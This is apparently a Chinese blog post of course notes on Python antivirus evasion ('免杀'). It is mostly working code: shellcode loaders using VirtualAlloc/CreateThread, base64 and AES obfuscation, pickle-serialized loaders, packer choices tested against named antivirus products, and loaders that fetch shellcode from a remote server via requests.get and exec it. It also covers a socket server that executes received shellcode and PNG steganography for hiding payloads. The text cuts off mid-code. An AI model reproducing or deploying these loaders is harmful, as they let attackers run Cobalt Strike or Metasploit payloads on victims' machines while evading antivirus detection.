{"title":"python免杀-小迪笔记","uid":"8d7177d71a9701596b230fd390060764","slug":"python免杀-小迪笔记","date":"2022-08-17T09:26:05.000Z","updated":"2022-09-05T11:26:44.457Z","comments":true,"path":"api/articles/python免杀-小迪笔记.json","keywords":null,"cover":null,"content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h1 id=\"python免杀-小迪安全\"><a href=\"#python免杀-小迪安全\" class=\"headerlink\" title=\"python免杀   小迪安全\"></a>python免杀   小迪安全</h1><h2 id=\"加载shellcode方式\"><a href=\"#加载shellcode方式\" class=\"headerlink\" title=\"加载shellcode方式\"></a>加载shellcode方式</h2><p>首先是shellcode两种常见的利用python的加载方式</p>\n<ol>\n<li></li>\n</ol>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">import ctypes\n\nshellcode &#x3D; b&#39;&#39;\n\nrwxpage &#x3D; ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)\nctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))\nhandle &#x3D; ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)\nctypes.windll.kernel32.WaitForSingleObject(handle, -1)</code></pre>\n\n<ol start=\"2\">\n<li></li>\n</ol>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">import ctypes\n\nshellcode &#x3D; b&#39;&#39;\n\nctypes.windll.kernel32.VirtualAlloc.restype &#x3D; ctypes.c_int\n\nptr &#x3D; ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(bdata)), ctypes.c_int(0x3000),ctypes.c_int(0x40))\n\nbuf &#x3D; (ctypes.c_char * len(bdata)).from_buffer(bdata)\nctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(bdata)))\n\nhandle &#x3D; ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n\nctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))</code></pre>\n\n<p>代码中每个函数的意思就不写了，想了解的看这篇：<a href=\"https://blog.csdn.net/solitudi/article/details/115283329\">https://blog.csdn.net/solitudi/article/details/115283329</a></p>\n<p>讲讲小白入门的坑点吧！！！</p>\n<p>首先就是python的环境，刚开始在本机、虚拟机、win服务器都测试了一遍，都不能正常运行一直报错，后来才知道这个加载方式必须要使用python的<strong>32位版本</strong>，只有32位才能正常运行上面的代码。</p>\n<p>python是32位的，那payload当然也必须是32位的。</p>\n<p>然后就是ctypes这个库，在使用pip安装之后，你会发现还是加载不了，这个时候就需要去找到下载的库文件，修改ctypes这个文件夹的首字母为<strong>大写</strong>，之后才能正常的加载这个库。还是不行，就用pip安装<strong>ctypesdemo</strong>这个库，再修改ctypes文件夹首字母大写。</p>\n<p>解决上面的问题，你就能正常执行代码。上线cs和msf了。</p>\n<h2 id=\"编码混淆\"><a href=\"#编码混淆\" class=\"headerlink\" title=\"编码混淆\"></a>编码混淆</h2><p>直接加载shellcode，不用说，肯定被杀，所以要将shellcode进行编码或者加密达到混淆的效果，绕过杀软的检测</p>\n<h3 id=\"base64\"><a href=\"#base64\" class=\"headerlink\" title=\"base64\"></a>base64</h3><p>首先就是base64编码了，将shellcode进行base64编码，将编码的作为shellcode，在执行前进行解码</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">import ctypes\n\nshellcode &#x3D; b&#39;base64(shellcode)&#39;\n#base64.b64encode(shellcode)\nbase64.b64decode(shellcode)\n\nrwxpage &#x3D; ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)\nctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))\nhandle &#x3D; ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)\nctypes.windll.kernel32.WaitForSingleObject(handle, -1)</code></pre>\n\n<h3 id=\"aes\"><a href=\"#aes\" class=\"headerlink\" title=\"aes\"></a>aes</h3><p>base64用的太多，在进行一层aes加密。使用base64编码的shellcode进行aes加密，用该加密shellcode作为代码中的shellcode，之后进行aes加密，再base64解码，在进行加载shellcode</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">from Crypto.Cipher import AES\nimport ctypes\nimport base64\n\nBLOCK_SIZE &#x3D; 16  # Bytes\npad &#x3D; lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \\\n                chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)\nunpad &#x3D; lambda s: s[:-ord(s[len(s) - 1:])]\n\ndef aesDecrypt(key, data):\n    &#39;&#39;&#39;\n\n    :param key: 密钥\n    :param data: 加密后的数据（密文）\n    :return:明文\n    &#39;&#39;&#39;\n    key &#x3D; key.encode(&#39;utf8&#39;)\n    data &#x3D; base64.b64decode(data)\n    cipher &#x3D; AES.new(key, AES.MODE_ECB)\n\n    # 去补位\n    text_decrypted &#x3D; unpad(cipher.decrypt(data))\n    text_decrypted &#x3D; text_decrypted.decode(&#39;utf8&#39;)\n    #print(text_decrypted)\n    return text_decrypted\n\naes1 &#x3D; &#39;&#39;&#39;加密后的shellcode&#39;&#39;&#39;\n\nkey &#x3D; &#39;5c44c819appsapi0&#39;\nshellcode &#x3D; aesDecrypt(key, aes1)\n\ndata&#x3D;base64.b64decode(shellcode)\n\nbdata &#x3D; bytearray(data)\nctypes.windll.kernel32.VirtualAlloc.restype &#x3D; ctypes.c_int\nptr &#x3D; ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(bdata)), ctypes.c_int(0x3000),ctypes.c_int(0x40))\nbuf &#x3D; (ctypes.c_char * len(bdata)).from_buffer(bdata)\nctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(bdata)))\nhandle &#x3D; ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\nctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))</code></pre>\n\n<p>这两种都是最常见的编码加密方式，还有xor，hex等。后面还可以尝试其他比较少见或者自己写个加密算法进行加密，可以达到很好的效果。</p>\n<h2 id=\"序列化\"><a href=\"#序列化\" class=\"headerlink\" title=\"序列化\"></a>序列化</h2><p>利用pickle库，将整个加载shellcode代码二进制化，在进行base64编码，将输出结果放到新的python文件里，使用pickle.loads()方式反序列化执行。</p>\n<ol>\n<li>序列化代码</li>\n</ol>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">import pickle\nimport base64\n\nshellcode &#x3D; &#39;&#39;&#39;\nimport ctypes,base64\nshellcode &#x3D; &quot;base64(shellcode)&quot;\ndata&#x3D;base64.b64decode(shellcode)\n#bdata &#x3D; bytearray(data)\nrwxpage &#x3D; ctypes.windll.kernel32.VirtualAlloc(0, len(data), 0x1000, 0x40)\nctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(data), len(data))\nhandle &#x3D; ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)\nctypes.windll.kernel32.WaitForSingleObject(handle, -1)&#39;&#39;&#39;\n\n\nclass A(object):\n    def __reduce__(self):\n        return (exec, (shellcode,))\n\n\nret &#x3D; pickle.dumps(A())\nret_base64 &#x3D; base64.b64encode(ret)\nprint(ret_base64)</code></pre>\n\n<ol start=\"2\">\n<li>反序列化执行</li>\n</ol>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">import base64,pickle,ctypes\nshellcode &#x3D; b&#39;序列化编码结果&#39;\npickle.loads(base64.b64decode(shellcode))</code></pre>\n\n<p>这种方式看起来花里胡哨的，最后生成exe直接被火绒给杀了，测试时好像过了360上线一段时间也没有被杀，当然只是学习思路</p>\n<h2 id=\"打包器\"><a href=\"#打包器\" class=\"headerlink\" title=\"打包器\"></a>打包器</h2><p>使用不同打包器也会有不同的免杀效果</p>\n<h3 id=\"pyinstaller\"><a href=\"#pyinstaller\" class=\"headerlink\" title=\"pyinstaller\"></a>pyinstaller</h3><p>python最常使用的就是pyinstaller，最方便但是几乎没有免杀效果</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">安装：\npip install pyinstaller\n\n常用：\npyinstall -F xxx.py</code></pre>\n\n<p>好处就是生成的exe不用携带dll文件之类的</p>\n<h3 id=\"py2exe\"><a href=\"#py2exe\" class=\"headerlink\" title=\"py2exe\"></a>py2exe</h3><p>需要自建setup.py来进行打包，免杀效果有那么一点，会产生dll文件，不携带无法运行exe文件</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">安装：\npip install py2exe\n\n打包：\npython setup.py py2exe</code></pre>\n\n<p>setup.py代码</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">from distutils.core import setup\nimport py2exe\nINCLUDES &#x3D;[&#39;xxx&#39;]#注意修改脚本项目名\noptions &#x3D;&#123;\n&quot;py2exe&quot;:\n&#123;\n&quot;compressed&quot;:1,# 0或1,1压缩，0不压缩\n&quot;optimize&quot;:2,# 0、1、2，文件的优化级别\n&quot;bundle_files&quot;:1,# 1、2、3,1表示所有文件打包成一个exe文件，2表示除了Python的解释器外都绑定，3表示不绑定\n&quot;includes&quot;: INCLUDES,# 列表，包含其它的一些模块\n&quot;dll_excludes&quot;:[&#39;MSVCP90.dll&#39;]# 列表，包含的dll文件不会打包进exe程序\n&#125;\n&#125;\nsetup(\nversion&#x3D;&#39;1.0.0&#39;,\noptions&#x3D;options,\ndescription&#x3D;&quot;this is a xiaodi test&quot;,\nzipfile&#x3D;None,# 公用文件的压缩文件名称，默认为“library.zip”；如果没有，则会将这些文件放在最终的exe文件中\nconsole&#x3D;[&#123;&quot;script&quot;:&#39;xxx.py&#39;&#125;]# 生成一个控制台形式的exe程序，对应的有windows&#x3D;[]，生成GUI形式的exe程序\n)</code></pre>\n\n<p>需要修改INCLUDES后面的内容位py文件名不带后缀，然后是下面的console，需要携带后缀名。</p>\n<h3 id=\"Nuitka\"><a href=\"#Nuitka\" class=\"headerlink\" title=\"Nuitka\"></a>Nuitka</h3><p>免杀效果还行，就是会有一堆附属文件需要整个dict文件夹上传才能运行</p>\n<p>安装参考：<a href=\"https://zhuanlan.zhihu.com/p/133303836\">https://zhuanlan.zhihu.com/p/133303836</a></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">最常用使用方式：\nnuitka --mingw64 --standalone --show-memory --show-progress --nofollow-imports --follow-import-to&#x3D;utils,src --output-dir&#x3D;out xxx.py</code></pre>\n\n<h2 id=\"文件提取shellcode\"><a href=\"#文件提取shellcode\" class=\"headerlink\" title=\"文件提取shellcode\"></a>文件提取shellcode</h2><p>前面不管哪种方式，shellcode代码都是存在源py文件中，只是加密方式不同，文本提取则不同，shellcode本身并不会存在于源py文件，而是从外部获取。就是常说的无文件落地。</p>\n<h3 id=\"readfile\"><a href=\"#readfile\" class=\"headerlink\" title=\"readfile\"></a>readfile</h3><p>最简单的就是从txt文件获取，小迪师傅演示三种，一种是读取shellcode，一种是读取shellcode和加载器，一种是读取混淆后的shellcode，替换混淆值为空</p>\n<p>直接来三种结合的，读取混淆的shellcode和加载器</p>\n<p>添加的混淆字符串还是使用xiaodi</p>\n<p>readfile代码</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">import ctypes\nimport base64\n\n\ndef sc():\n    with open(&#39;s.txt&#39;, &#39;r&#39;) as f:\n        s &#x3D; f.read()\n    s &#x3D; s.replace(&#39;xiaodi&#39;, &#39;&#39;)\n    sc &#x3D; base64.b64decode(s)\n    return sc\n\ndef zx(s):\n    sc&#x3D;s\n    with open(&#39;z.txt&#39;, &#39;r&#39;) as f:\n        z &#x3D; f.read()\n    z &#x3D; z.replace(&#39;xiaodi&#39;, &#39;&#39;)\n    zx &#x3D; base64.b64decode(z)\n    exec(zx)\n\ns&#x3D;sc()\nz&#x3D;zx(s)\nprint(z)</code></pre>\n\n<p>s.txt</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">内容是base64编码并采用小迪字符串混淆的shellcode</code></pre>\n\n<p>z.txt</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">内容是base64编码并采用小迪字符串混淆的加载器代码</code></pre>\n\n<p>免杀效果就不说了，比较只是学习思路</p>\n<h3 id=\"argv参数获取\"><a href=\"#argv参数获取\" class=\"headerlink\" title=\"argv参数获取\"></a>argv参数获取</h3><p>前面采用文本获取，这里则是参数获取shellcode和加载器代码</p>\n<p>使用命令行输入加密shellcode和加密python加载器代码上线</p>\n<p>python test_argv.py base64shellcode base64加载器代码</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">import ctypes\nimport sys,base64\n\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    s&#x3D;sys.argv[1]\n    sc&#x3D;base64.b64decode(s)\n    z&#x3D;sys.argv[2]\n    zx&#x3D;base64.b64decode(z)\n    exec(zx)</code></pre>\n\n<h3 id=\"http远程加载\"><a href=\"#http远程加载\" class=\"headerlink\" title=\"http远程加载\"></a>http远程加载</h3><p>将shellcode放到远程服务器的txt文件，用python开启http.serve服务，本地使用python的request请求加载</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">import ctypes,requests,base64\n\n\n\ndef g():\n    all&#x3D;requests.get(&#39;http:&#x2F;&#x2F;IP&#x2F;1.txt&#39;).text\n    return all\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    all&#x3D;base64.b64decode(g())\n    exec(all)</code></pre>\n\n<h3 id=\"socket管道传输\"><a href=\"#socket管道传输\" class=\"headerlink\" title=\"socket管道传输\"></a>socket管道传输</h3><p>使用python开辟socket通道，上传服务端，本地使用客户端连接，通过客户端发送加载代码，服务端执行</p>\n<p>服务端</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\"># -*- coding:utf-8 -*-\n__author__ &#x3D; &#39;xiaodi&#39;\n\nimport kaisa\nimport socket,base64,ctypes,os\nserver&#x3D;socket.socket()\n\n\ndef zx(data):\n    sc&#x3D;base64.b64decode(data+b&#39;xxxxxxxxxxxxxxxxxxxxxx&#39;)\n    print(sc)\n    rwxpage &#x3D; ctypes.windll.kernel32.VirtualAlloc(0, len(sc), 0x1000, 0x40)\n    ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(sc), len(sc))\n    handle &#x3D; ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)\n    ctypes.windll.kernel32.WaitForSingleObject(handle, -1)\n    return sc\n\n\nserver &#x3D; socket.socket()\nserver.bind((&quot;0.0.0.0&quot;,9999))\nserver.listen(5)\nwhile True:\n    conn,addr &#x3D; server.accept()\n    print(&quot;new addr:&quot;,addr)\n    while True:\n        data &#x3D; conn.recv(1024)\n        if not data:\n            print(&quot;客户端已断开&quot;)\n            break\n        print(&quot;执行指令：&quot;,data)\n        zx(data)\n        if len(cmd_res) &#x3D;&#x3D; 0:\n            cmd_res &#x3D; &quot;cmd has no output....&quot;\n        conn.send( str(len(cmd_res.encode())).encode() )  #发送服务端发送给客户端数据的长度\n        conn.send(cmd_res.encode(&quot;utf-8&quot;))   #发送服务端的数据\n        print(&quot;send done&quot;)\nserver.close()</code></pre>\n\n<p>客户端</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">import socket\n\nclient &#x3D; socket.socket()\nclient.connect((&quot;IP&quot;, 9999))\n\nwhile True:\n    cmd &#x3D; input(&quot;&gt;&gt;&gt;:&quot;).strip()\n    if len(cmd) &#x3D;&#x3D; 0: continue\n    client.send(cmd.encode(&quot;utf-8&quot;))\n    cmd_res_size &#x3D; client.recv(1024)  # 接收命令的长度\n    print(&quot;命令结果大小：&quot;, cmd_res_size.decode())\n    recevied_size &#x3D; 0  # 接收客户端发来数据的计算器\n    recevied_data &#x3D; b&#39;&#39;  # 客户端每次发来内容的计数器\n    while recevied_size &lt; int(cmd_res_size.decode()):  # 当接收的数据大小 小于 客户端发来的数据\n        cmd_res &#x3D; client.recv(1024)\n        recevied_size +&#x3D; len(cmd_res)  # 每次收到的服务端的数据有可能小于1024，所以必须用len判断\n        recevied_data +&#x3D; cmd_res\n    else:\n        print(recevied_data.decode(&quot;utf-8&quot;, &quot;ignore&quot;))\n        print(&quot;cmd res receive done ....&quot;, recevied_size)\n\nclient.close()</code></pre>\n\n<p>注意：服务端的zx函数中的sc需要截取最后一写加密的shellcode代码，全部使用客户端发送加载会导致报错</p>\n<p>当然需要修改客户端的远程连接IP</p>\n<p>先运行服务端，在使用客户端连接，之后会让你输入，输入前面那段shellcode代码之后就会自动上线</p>\n<p>还有一种采用自己编写的加密方式的，参考：<a href=\"https://forum.butian.net/share/1794\">https://forum.butian.net/share/1794</a></p>\n<h3 id=\"隐写入PNG图片\"><a href=\"#隐写入PNG图片\" class=\"headerlink\" title=\"隐写入PNG图片\"></a>隐写入PNG图片</h3><p>使用pillow库写入PNG图片</p>\n<p>写入python文件</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">#!&#x2F;usr&#x2F;bin&#x2F;env python3\n#coding&#x3D;utf-8\n\n&quot;&quot;&quot;Encode png image via command-line.\n\nUsage:\n    imageEncoding (-e|encode) &lt;originImage&gt; [&lt;text&gt;] [&lt;encodedImage&gt;]\n    imageEncoding (-d|decode) &lt;encodedImage&gt;\n\nOptions:\n    -h,--help   显示帮助菜单\n    -e          加密\n    -d          解密\n\nExample:\n    imageEncoding -e coffee.png hello textOrFileToEncode encodedImage.png\n    imageEncoding -d encodedImage.png\n&quot;&quot;&quot;\n\nfrom PIL import Image\nfrom docopt import docopt\n\n\n&quot;&quot;&quot;\n取得一个 PIL 图像并且更改所有值为偶数（使最低有效位为 0）\n&quot;&quot;&quot;\ndef RGBAmakeImageEven(image):\n    pixels &#x3D; list(image.getdata())  # 得到一个这样的列表： [(r,g,b,t),(r,g,b,t)...]\n    evenPixels &#x3D; [(r&gt;&gt;1&lt;&lt;1,g&gt;&gt;1&lt;&lt;1,b&gt;&gt;1&lt;&lt;1,t&gt;&gt;1&lt;&lt;1) for [r,g,b,t] in pixels]  # 更改所有值为偶数（魔法般的移位）\n    evenImage &#x3D; Image.new(image.mode, image.size)  # 创建一个相同大小的图片副本\n    evenImage.putdata(evenPixels)  # 把上面的像素放入到图片副本\n    return evenImage\n\ndef RGBmakeImageEven(image):\n    pixels &#x3D; list(image.getdata())  # 得到一个这样的列表： [(r,g,b,t),(r,g,b,t)...]\n    evenPixels &#x3D; [(r&gt;&gt;1&lt;&lt;1,g&gt;&gt;1&lt;&lt;1,b&gt;&gt;1&lt;&lt;1) for [r,g,b] in pixels]  # 更改所有值为偶数（魔法般的移位）\n    evenImage &#x3D; Image.new(image.mode, image.size)  # 创建一个相同大小的图片副本\n    evenImage.putdata(evenPixels)  # 把上面的像素放入到图片副本\n    return evenImage\n\n&quot;&quot;&quot;\n内置函数 bin() 的替代，返回固定长度的二进制字符串\n&quot;&quot;&quot;\ndef constLenBin(int):\n    binary &#x3D; &quot;0&quot;*(8-(len(bin(int))-2))+bin(int).replace(&#39;0b&#39;,&#39;&#39;)  # 去掉 bin() 返回的二进制字符串中的 &#39;0b&#39;，并在左边补足 &#39;0&#39; 直到字符串长度为 8\n    return binary\n\n&quot;&quot;&quot;\n将字符串编码到图片中\n&quot;&quot;&quot;\ndef RGBAencodeDataInImage(image, data):\n    evenImage &#x3D; RGBAmakeImageEven(image)  # 获得最低有效位为 0 的图片副本\n    binary &#x3D; &#39;&#39;.join(map(constLenBin,bytearray(data, &#39;utf-8&#39;))) # 将需要被隐藏的字符串转换成二进制字符串\n    if len(binary) &gt; len(image.getdata()) * 4:  # 如果不可能编码全部数据， 抛出异常\n        raise Exception(&quot;Error: Can&#39;t encode more than &quot; + len(evenImage.getdata()) * 4 + &quot; bits in this image. &quot;)\n    encodedPixels &#x3D; [(r+int(binary[index*4+0]),g+int(binary[index*4+1]),b+int(binary[index*4+2]),t+int(binary[index*4+3])) if index*4 &lt; len(binary) else (r,g,b,t) for index,(r,g,b,t) in enumerate(list(evenImage.getdata()))] # 将 binary 中的二进制字符串信息编码进像素里\n    encodedImage &#x3D; Image.new(evenImage.mode, evenImage.size)  # 创建新图片以存放编码后的像素\n    encodedImage.putdata(encodedPixels)  # 添加编码后的数据\n    return encodedImage\n\ndef RGBencodeDataInImage(image, data):\n    evenImage &#x3D; RGBmakeImageEven(image)  # 获得最低有效位为 0 的图片副本\n    binary &#x3D; &#39;&#39;.join(map(constLenBin,bytearray(data, &#39;utf-8&#39;))) # 将需要被隐藏的字符串转换成二进制字符串\n    if len(binary)%3 !&#x3D; 0:  # 将转换的比特流数据末位补零，使其长度为3的倍数，防止其在下面重新编码的过程中发生越界\n        rema &#x3D; len(binary)%3\n        binary &#x3D; binary+(&#39;0&#39;*(3-rema))\n#        print(len(binary))\n    if len(binary) &gt; len(image.getdata()) * 3:  # 如果不可能编码全部数据， 抛出异常\n        raise Exception(&quot;Error: Can&#39;t encode more than &quot; + len(evenImage.getdata()) * 3 + &quot; bits in this image. &quot;)\n    encodedPixels &#x3D; [(r+int(binary[index*3+0]),g+int(binary[index*3+1]),b+int(binary[index*3+2])) if index*3 &lt; len(binary) else (r,g,b) for index, (r,g,b) in enumerate(list(evenImage.getdata()))] # 将 binary 中的二进制字符串信息编码进像素里\n    encodedImage &#x3D; Image.new(evenImage.mode, evenImage.size)  # 创建新图片以存放编码后的像素\n    encodedImage.putdata(encodedPixels)  # 添加编码后的数据\n    return encodedImage\n\n&quot;&quot;&quot;\n从二进制字符串转为 UTF-8 字符串\n&quot;&quot;&quot;\ndef binaryToString(binary):\n    index &#x3D; 0\n    string &#x3D; []\n    rec &#x3D; lambda x, i: x[2:8] + (rec(x[8:], i-1) if i &gt; 1 else &#39;&#39;) if x else &#39;&#39;\n    # rec &#x3D; lambda x, i: x and (x[2:8] + (i &gt; 1 and rec(x[8:], i-1) or &#39;&#39;)) or &#39;&#39;\n    fun &#x3D; lambda x, i: x[i+1:8] + rec(x[8:], i-1)\n    while index + 1 &lt; len(binary):\n        chartype &#x3D; binary[index:].index(&#39;0&#39;) # 存放字符所占字节数，一个字节的字符会存为 0\n        length &#x3D; chartype*8 if chartype else 8\n        string.append(chr(int(fun(binary[index:index+length],chartype),2)))\n        index +&#x3D; length\n    return &#39;&#39;.join(string)\n\n&quot;&quot;&quot;\n解码隐藏数据\n&quot;&quot;&quot;\ndef RGBAdecodeImage(image):\n    pixels &#x3D; list(image.getdata())  # 获得像素列表\n    binary &#x3D; &#39;&#39;.join([str(int(r&gt;&gt;1&lt;&lt;1!&#x3D;r))+str(int(g&gt;&gt;1&lt;&lt;1!&#x3D;g))+str(int(b&gt;&gt;1&lt;&lt;1!&#x3D;b))+str(int(t&gt;&gt;1&lt;&lt;1!&#x3D;t)) for (r,g,b,t) in pixels]) # 提取图片中所有最低有效位中的数据\n    # 找到数据截止处的索引\n    locationDoubleNull &#x3D; binary.find(&#39;0000000000000000&#39;)\n    endIndex &#x3D; locationDoubleNull+(8-(locationDoubleNull % 8)) if locationDoubleNull%8 !&#x3D; 0 else locationDoubleNull\n    data &#x3D; binaryToString(binary[0:endIndex])\n    return data\n\ndef RGBdecodeImage(image):\n    pixels &#x3D; list(image.getdata())  # 获得像素列表\n    binary &#x3D; &#39;&#39;.join([str(int(r&gt;&gt;1&lt;&lt;1!&#x3D;r))+str(int(g&gt;&gt;1&lt;&lt;1!&#x3D;g))+str(int(b&gt;&gt;1&lt;&lt;1!&#x3D;b)) for (r,g,b) in pixels]) # 提取图片中所有最低有效位中的数据\n    # 找到数据截止处的索引\n    locationDoubleNull &#x3D; binary.find(&#39;0000000000000000&#39;)\n    endIndex &#x3D; locationDoubleNull+(8-(locationDoubleNull % 8)) if locationDoubleNull%8 !&#x3D; 0 else locationDoubleNull\n    data &#x3D; binaryToString(binary[0:endIndex])\n    return data\n\ndef isTextFile(path):\n    if path.endswith(&quot;.txt&quot;):\n        return True\n    elif path.endswith(&quot;.m&quot;):\n        return True\n    elif path.endswith(&quot;.h&quot;):\n        return True\n    elif path.endswith(&quot;.c&quot;):\n        return True\n    elif path.endswith(&quot;.py&quot;):\n        return True\n    else:\n        return False\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    &quot;&quot;&quot;command-line interface&quot;&quot;&quot;\n    arguments &#x3D; docopt(__doc__)\n#    print(arguments)\n\n    if arguments[&#39;-e&#39;] or arguments[&#39;encode&#39;]:\n        if arguments[&#39;&lt;text&gt;&#39;] is None:\n            arguments[&#39;&lt;text&gt;&#39;] &#x3D; &quot;待加密的文本&quot;\n        if arguments[&#39;&lt;encodedImage&gt;&#39;] is None:\n            arguments[&#39;&lt;encodedImage&gt;&#39;] &#x3D; &quot;encodedImage.png&quot;\n\n        if isTextFile(arguments[&#39;&lt;text&gt;&#39;]):\n            with open(arguments[&#39;&lt;text&gt;&#39;], &#39;rt&#39;) as f:\n                arguments[&#39;&lt;text&gt;&#39;] &#x3D; f.read()\n\n        print(&quot;载体图片:&quot;)\n        print(arguments[&#39;&lt;originImage&gt;&#39;]+&quot;\\n&quot;)\n        print(&quot;待加密密文:&quot;)\n        print(arguments[&#39;&lt;text&gt;&#39;]+&quot;\\n&quot;)\n        print(&quot;加密后图片:&quot;)\n        print(arguments[&#39;&lt;encodedImage&gt;&#39;]+&quot;\\n&quot;)\n        print(&quot;加密中……\\n&quot;)\n        im &#x3D; Image.open(arguments[&#39;&lt;originImage&gt;&#39;])\n        if im.mode &#x3D;&#x3D; &#39;RGBA&#39;:\n            RGBAencodeDataInImage(im, arguments[&#39;&lt;text&gt;&#39;]).save(arguments[&#39;&lt;encodedImage&gt;&#39;])\n        # elif im.mode &#x3D;&#x3D; &#39;RGB&#39;:\n        #     RGBencodeDataInImage(im, arguments[&#39;&lt;text&gt;&#39;]).save(arguments[&#39;&lt;encodedImage&gt;&#39;])\n        else:\n            print(&quot;暂不支持此图片格式……&quot;)\n\n        print(&quot;加密完成,密文为：\\n&quot;+arguments[&#39;&lt;text&gt;&#39;]+&quot;\\n&quot;)\n    elif arguments[&#39;-d&#39;] or arguments[&#39;decode&#39;]:\n        print(&quot;解密中……\\n&quot;)\n        im &#x3D; Image.open(arguments[&#39;&lt;encodedImage&gt;&#39;])\n        if im.mode &#x3D;&#x3D; &#39;RGBA&#39;:\n            print(&quot;解秘完成，密文为：\\n&quot;+RGBAdecodeImage(im)+&quot;\\n&quot;)\n        # elif im.mode &#x3D;&#x3D; &#39;RGB&#39;:\n        #     print(&quot;解秘完成，密文为：\\n&quot;+RGBdecodeImage(im)+&quot;\\n&quot;)\n        else:\n            print(&quot;非法的图片格式……&quot;)</code></pre>\n\n<p><strong>使用：xx.py -e 被写入图片.PNG  写入内容</strong></p>\n<p>解密执行python文件</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">#!&#x2F;usr&#x2F;bin&#x2F;env python3\n#coding&#x3D;utf-8\n\n&quot;&quot;&quot;Encode png image via command-line.\n\nUsage:\n    imageEncoding (-e|encode) &lt;originImage&gt; [&lt;text&gt;] [&lt;encodedImage&gt;]\n    imageEncoding (-d|decode) &lt;encodedImage&gt;\n\nOptions:\n    -h,--help   显示帮助菜单\n    -e          加密\n    -d          解密\n\nExample:\n    imageEncoding -e coffee.png hello textOrFileToEncode encodedImage.png\n    imageEncoding -d encodedImage.png\n&quot;&quot;&quot;\n\nfrom PIL import Image\nfrom docopt import docopt\nimport base64,ctypes\n\n\n\n&quot;&quot;&quot;\n内置函数 bin() 的替代，返回固定长度的二进制字符串\n&quot;&quot;&quot;\ndef constLenBin(int):\n    binary &#x3D; &quot;0&quot;*(8-(len(bin(int))-2))+bin(int).replace(&#39;0b&#39;,&#39;&#39;)  # 去掉 bin() 返回的二进制字符串中的 &#39;0b&#39;，并在左边补足 &#39;0&#39; 直到字符串长度为 8\n    return binary\n\n&quot;&quot;&quot;\n将字符串编码到图片中\n&quot;&quot;&quot;\n\n\n&quot;&quot;&quot;\n从二进制字符串转为 UTF-8 字符串\n&quot;&quot;&quot;\ndef binaryToString(binary):\n    index &#x3D; 0\n    string &#x3D; []\n    rec &#x3D; lambda x, i: x[2:8] + (rec(x[8:], i-1) if i &gt; 1 else &#39;&#39;) if x else &#39;&#39;\n    # rec &#x3D; lambda x, i: x and (x[2:8] + (i &gt; 1 and rec(x[8:], i-1) or &#39;&#39;)) or &#39;&#39;\n    fun &#x3D; lambda x, i: x[i+1:8] + rec(x[8:], i-1)\n    while index + 1 &lt; len(binary):\n        chartype &#x3D; binary[index:].index(&#39;0&#39;) # 存放字符所占字节数，一个字节的字符会存为 0\n        length &#x3D; chartype*8 if chartype else 8\n        string.append(chr(int(fun(binary[index:index+length],chartype),2)))\n        index +&#x3D; length\n    return &#39;&#39;.join(string)\n\n&quot;&quot;&quot;\n解码隐藏数据\n&quot;&quot;&quot;\ndef RGBAdecodeImage(image):\n    pixels &#x3D; list(image.getdata())  # 获得像素列表\n    binary &#x3D; &#39;&#39;.join([str(int(r&gt;&gt;1&lt;&lt;1!&#x3D;r))+str(int(g&gt;&gt;1&lt;&lt;1!&#x3D;g))+str(int(b&gt;&gt;1&lt;&lt;1!&#x3D;b))+str(int(t&gt;&gt;1&lt;&lt;1!&#x3D;t)) for (r,g,b,t) in pixels]) # 提取图片中所有最低有效位中的数据\n    # 找到数据截止处的索引\n    locationDoubleNull &#x3D; binary.find(&#39;0000000000000000&#39;)\n    endIndex &#x3D; locationDoubleNull+(8-(locationDoubleNull % 